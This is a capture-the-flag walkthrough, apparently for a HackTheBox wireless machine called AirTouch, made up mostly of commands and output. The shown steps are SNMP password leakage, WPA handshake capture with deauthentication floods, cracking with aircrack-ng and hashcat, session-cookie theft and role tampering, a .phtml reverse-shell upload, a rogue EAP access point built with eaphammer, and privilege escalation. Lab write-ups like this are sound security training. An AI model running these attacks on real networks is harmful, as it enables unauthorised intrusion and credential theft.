# Initial Recon 

```bash 
Nmap scan report for 10.129.244.98
Host is up (0.12s latency).
Not shown: 976 closed udp ports (port-unreach)
PORT      STATE         SERVICE         VERSION
13/udp    open|filtered daytime
68/udp    open|filtered dhcpc
137/udp   open|filtered netbios-ns
161/udp   open          snmp            net-snmp; net-snmp SNMPv3 server
| snmp-sysdescr: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
|_  System uptime: 20m49.52s (124952 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 46d42b7aa9569b6900000000
|   snmpEngineBoots: 1
|_  snmpEngineTime: 20m49s
1087/udp  open|filtered cplscrambler-in
5355/udp  open|filtered llmnr
9876/udp  open|filtered sd
18228/udp open|filtered unknown
18258/udp open|filtered unknown
18676/udp open|filtered unknown
18888/udp open|filtered apc-necmp
19707/udp open|filtered unknown
19728/udp open|filtered unknown
21625/udp open|filtered unknown
24910/udp open|filtered unknown
29977/udp open|filtered unknown
32345/udp open|filtered unknown
32772/udp open|filtered sometimes-rpc8
45928/udp open|filtered unknown
49158/udp open|filtered unknown
49213/udp open|filtered unknown
58640/udp open|filtered unknown
59765/udp open|filtered unknown
64481/udp open|filtered unknown
```

password revelad `RxBlZhLmOkacNWScmZ6D`

doing an snmp walk gave us this 

```bash 
snmpwalk -v2c -c public 10.129.244.98 
iso.3.6.1.2.1.1.1.0 = STRING: "\"The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)\""
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (145926) 0:24:19.26
iso.3.6.1.2.1.1.4.0 = STRING: "admin@AirTouch.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "Consultant"
iso.3.6.1.2.1.1.6.0 = STRING: "\"Consultant pc\""
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (152333) 0:25:23.33
iso.3.6.1.2.1.25.1.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

soo this didnt reveal anything but we got ssh with user `consultant`

<img src="./assets/Pasted image 20260222204805.png">

we found two picture showing the architecture of the network 

<img src="./assets/Pasted image 20260222205131.png">

<img src="./assets/Pasted image 20260222205140.png">

and on the `/etc/hosts` found these ip

```bash 
 cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1       AirTouch-Consultant
172.20.1.2      AirTouch-Consultant
```

and investigating more finding a lot of ifaces are down 
```bash 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if29: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether ee:7e:58:fd:89:85 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.1.2/24 brd 172.20.1.255 scope global eth0
       valid_lft forever preferred_lft forever
7: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
8: wlan1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
9: wlan2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
10: wlan3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
11: wlan4: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
12: wlan5: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff
13: wlan6: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
```

its a wireless penetration box .. thats new on hackthebox , aircack ng is present on the box and we found even more info about the network 

```
sudo iwlist wlan0 scan 
wlan0     Scan completed :
          Cell 01 - Address: 7A:D5:B6:99:CA:F9
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"vodafoneFB6N"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064b6f079a88df
                    Extra: Last beacon: 80ms ago
                    IE: Unknown: 000C766F6461666F6E654642364E
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (1) : TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 02 - Address: B2:86:A6:21:1F:B7
                    Channel:3
                    Frequency:2.422 GHz (Channel 3)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"MOVISTAR_FG68"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064b6f079c7c21
                    Extra: Last beacon: 80ms ago
                    IE: Unknown: 000D4D4F5649535441525F46473638
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030103
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 03 - Address: F0:9F:C2:A3:F1:A7
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"AirTouch-Internet"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064b6f079f7972
                    Extra: Last beacon: 80ms ago
                    IE: Unknown: 0011416972546F7563682D496E7465726E6574
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030106
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 04 - Address: 9A:9B:55:29:C7:D4
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"WIFI-JOHN"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064b6f079f7983
                    Extra: Last beacon: 80ms ago
                    IE: Unknown: 0009574946492D4A4F484E
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030106
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 05 - Address: F2:D9:52:5B:A7:01
                    Channel:9
                    Frequency:2.452 GHz (Channel 9)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"MiFibra-24-D4VY"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064b6f07a267bb
                    Extra: Last beacon: 80ms ago
                    IE: Unknown: 000F4D6946696272612D32342D44345659
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030109
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 06 - Address: AC:8B:A9:AA:3F:D2
                    Channel:44
                    Frequency:5.22 GHz (Channel 44)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"AirTouch-Office"
                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 18 Mb/s; 24 Mb/s
                              36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064b6f07a93d55
                    Extra: Last beacon: 80ms ago
                    IE: Unknown: 000F416972546F7563682D4F6666696365
                    IE: Unknown: 01088C129824B048606C
                    IE: Unknown: 03012C
                    IE: Unknown: 070A45532024041795060D00
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : 802.1x
                    IE: Unknown: 3B027300
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD180050F2020101010003A4000027F7000043FF5E0067FF2F00
          Cell 07 - Address: AC:8B:A9:F3:A1:13
                    Channel:44
                    Frequency:5.22 GHz (Channel 44)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"AirTouch-Office"
                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 18 Mb/s; 24 Mb/s
                              36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00064b6f07a93d42
                    Extra: Last beacon: 80ms ago
                    IE: Unknown: 000F416972546F7563682D4F6666696365
                    IE: Unknown: 01088C129824B048606C
                    IE: Unknown: 03012C
                    IE: Unknown: 070A45532024041795060D00
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : 802.1x
                    IE: Unknown: 3B027300
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD180050F2020101010003A4000027F7000043FF5E0067FF2F00
```

we got the bssid `F0:9F:C2:A3:F1:A7` and we can now use aircrack-ng to capture a handshake 

start the iface 
```bash 
sudo airmon-ng start wlan0
```

monitor the router 
```bash 
sudo airodump-ng -c 6 --bssid F0:9F:C2:A3:F1:A7 -w capture wlan0mon
```

on another ssh session send deauth packets 
```bash 
sudo aireplay-ng -0 0 -a F0:9F:C2:A3:F1:A7 wlan0mon
```

until u see `EAPOL` means we deauthet the client connected to that network and we captured the handshake containing the hash for the wifi 

<img src="./assets/Pasted image 20260222210249.png">

<img src="./assets/Pasted image 20260222210307.png">

we dont have rockyout on the system so its easier to uplaod the file on our machine then we crack using airckrack 

```bash 
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

and we found it 

<img src="./assets/Pasted image 20260222210510.png">

so here there was a compilcation at first . wpa_supplicant still in use even after u kill the monitor interface with 

```bash 
airmon-ng stop wlan0mon 
```

so u kill the process  

```bash
sudo kill $(pgrep wpa_supplicant)
```

initial a conenction file to connect to AirTouch-Internet

```bash 
cat > wifi.conf << EOF 
p2p_disabled=1 
network={ 
	ssid="AirTouch-Internet" 
	psk="challenge" 
	key_mgmt=WPA-PSK 
	pairwise=CCMP TKIP 
	group=TKIP CCMP 
	}
EOF
```

connect to it 

```bash 
sudo ip link set wlan0 up
sudo wpa_supplicant -B -i wlan0 -c wifi.conf -D nl80211 -C /tmp/wpa_ctrl
sudo dhclient wlan0
```

and get the ip address ,on another ssh connection check the ip address 

<img src="./assets/Pasted image 20260222212019.png">

we are connected soo .. since the machine have the aircrack tools we already then have the rest like nmap then we can enumerate the new ip address range  `192.168.3.0/24`

## secon Recon

```bash 
nmap -sV -sC --min-rate=5000 192.168.3.0/24 -oN nmap.txt 
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-22 20:22 UTC
Nmap scan report for 192.168.3.1
Host is up (0.00032s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  dnsmasq 2.90
| dns-nsid: 
|_  bind.version: dnsmasq-2.90
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: WiFi Router Configuration
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.3.48
Host is up (0.00032s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (2 hosts up) scanned in 27.07 seconds
```

we forward the port to us 

```bash 
ssh -L 8080:192.168.3.1:80 consultant@10.129.244.98
```

and we access the router from the browser 

<img src="./assets/Pasted image 20260222212516.png">

bruteforcing gave us nothing, but decrypting the .cap file we got earlier when we kicked out the user connecting to it 

```bash
airdecap-ng -e "AirTouch-Internet" -p challenge capture-01.cap
```

this gave us this `capture-01-dec.cap` and we open it with wireshark ofc and we got a session cookie 


<img src="./assets/Pasted image 20260222213545.png">

we put it on our browser 

<img src="./assets/Pasted image 20260222213602.png">

in the decrypted pcap file another field in the cookie mentioned was the `UserRole` set to user 
if we change it something will appear on the login 

<img src="./assets/Pasted image 20260222215730.png">

and from the fuzzing earlier we got a directory called `uploads` and now we can create a reverse shell .. i used php pentestmonkey and i my stoopid ass was working the reverse to be on my kali machine forgetting its inside a network soo the reverseshell must got to the first machine we had access to also the .php file didnt work but only .phtml worked 

<img src="./assets/Pasted image 20260222223235.png">

no flag yet but on the index.php we can see the file the password that been redacted we can ssh to that user from the consultant machine 

<img src="./assets/Pasted image 20260222223808.png">

password for user `user:JunDRDZKHDnpkpDDvay` 

<img src="./assets/Pasted image 20260222223820.png">

upon invistigating more we found this process . might help us to go to 
AirTouch-office 

<img src="./assets/Pasted image 20260222224330.png">

but we need root first , but nvm we can exec the sudo command anyway 
<img src="./assets/Pasted image 20260222224427.png">

<img src="./assets/Pasted image 20260222224545.png">

and we finaly got user.txt .. wat the hell !!! 

and we have route to corp now

<img src="./assets/Pasted image 20260222224738.png">

# Priv escalation 

after a lot of digging up those file found on  hte certs-backup need to be used to open a rogue AP .. our main goal is the tabled . making it connecting back to us so we can get the creds for the `AirTouch-Office` 

first of all copying all the files to the home dir 

```bash 
mkdir /home/user/certs-backups 
cp /root/certs-backup/* /home/user/certs-backups
chown user /home/user/certs-backups  
```

downloading them to consultant machine 

```bash 
scp user@192.168.3.1:/home/user/cert-backup/* .
```

then we `sudo su` and go to `eaphammer` folder and execter the binary with the correct files 

```bash 
./eaphammer --interface wlan2 \
 --channel 6 \
 --essid "AirTouch-Office" \
 --creds \
 --auth wpa-eap \
 --server-cert /home/consultant/certs-backup/server.crt \
 --ca-cert /home/consultant/certs-backup/ca.crt \
 --private-key /home/consultant/certs-backup/server.key
```

we monitor the `AirTouch-Internet` station using one of the interfaces on another terrminal   

```bash
sudo airmon-ng start wlan3 
sudo airodump-ng --bssid F0:9F:C2:A3:F1:A7 wlan3mon 
```

<img src="./assets/Pasted image 20260224135650.png">

thats the tablet, now we quit the monotoring and kick it 

```bash 
sudo aireplay-ng -0 0 -a F0:9F:C2:A3:F1:A7 wlan3mon
```

well didnt work .. i investigated more and i found out i wasnt looking at all the bands to get the AirTouch-Office soo 

```bash
sudo airodump-ng --band abg wlan3mon
```

this totally worked 

<img src="./assets/Pasted image 20260224220509.png">

now we launch the server on channel 44 with that bssid 

```bash 
./eaphammer --interface wlan4 --channel 44 --essid "AirTouch-Office" --creds --auth wpa-eap --server-cert /home/consultant/certs-backups/server.crt --ca-cert /home/consultant/certs-backups/ca.crt --private-key /home/consultant/certs-backups/server.key --bssid AC:8B:A9:AA:3F:D2 
```

we monitor that the office AP 

```bash 
sudo airodump-ng --bssid AC:8B:A9:AA:3F:D2 --channel 44 --band a wlan3mon
```

<img src="./assets/Pasted image 20260224220619.png">

and we deauth now 

```bash 
sudo aireplay-ng -0 0 -a AC:8B:A9:AA:3F:D2 wlan3mon
```

<img src="./assets/Pasted image 20260224220646.png">

we got the NTLM , user `r4ulcl` , now we crack it 

```bash 
echo "r4ulcl::::ed6d1e5664a4ed3761faa1b1c4764e364d1b3c5aa7cc334e:5c150746dd894c1d" > hash.txt
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
```

<img src="./assets/Pasted image 20260224220918.png">

now we connect to airtouch-office 

```bash 
cat > ~/certs-backups/corp.conf << 'EOF'
p2p_disabled=1
network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="r4ulcl"
    password="laboratory"
    ca_cert="/home/consultant/certs-backups/ca.crt"
    phase2="auth=MSCHAPV2"
}
EOF

sudo kill -9 $(pgrep wpa_supplicant)

sudo wpa_supplicant -i wlan0 -c ~/certs-backups/corp.conf -D nl80211
```

<img src="./assets/Pasted image 20260224221450.png">

we request an ip 

```bash 
 sudo dhclient wlan2 
```

<img src="./assets/Pasted image 20260224222408.png">

we nmap the subnet now 

```bash 
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-24 21:25 UTC
tats: 0:00:08 elapsed; 0 hosts completed (0 up), 256 undergoing Ping Scan
Parallel DNS resolution of 256 hosts. Timing: About 0.00% done
Nmap scan report for 10.10.10.1
Host is up (0.00064s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain

Nmap scan report for 10.10.10.95
Host is up (0.00068s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (2 hosts up) scanned in 14.55 seconds

```

looking at the files before on the AP .. we have creds left there for connection we use them to ssh 

<img src="./assets/Pasted image 20260224224246.png">

and we are in 

<img src="./assets/Pasted image 20260224224631.png">

now the final phase . getting to root , we found another user `admin` , i went the thru the hustle of uploading linpeas to the new machine and found a critical hostapd file that stores the creds connected on the system 

```bash
/etc/hostapd/hostapd_wpe.eap_usersu admin
```

<img src="./assets/Pasted image 20260224231250.png">

we switch to admin and at least he has sudo to all 

<img src="./assets/Pasted image 20260224231324.png">

and finally we are root 

<img src="./assets/Pasted image 20260224231344.png">

